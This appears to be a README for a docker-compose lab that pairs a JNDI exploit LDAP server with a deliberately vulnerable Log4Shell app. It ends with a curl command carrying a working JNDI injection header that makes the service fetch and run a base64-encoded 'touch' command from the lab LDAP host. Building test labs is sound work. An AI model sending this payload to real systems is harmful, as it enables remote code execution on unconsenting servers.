### Log4shell docker-compose example 

Original LDAP server here https://github.com/feihong-cs/JNDIExploit/

Original log4shell example service here https://github.com/r00tkiiT/log4shell-vulnerable-app

This repo contains a docker-compose example with both services running

```sh
docker-compose up
```

```sh
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://ldap-hostname.svc:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```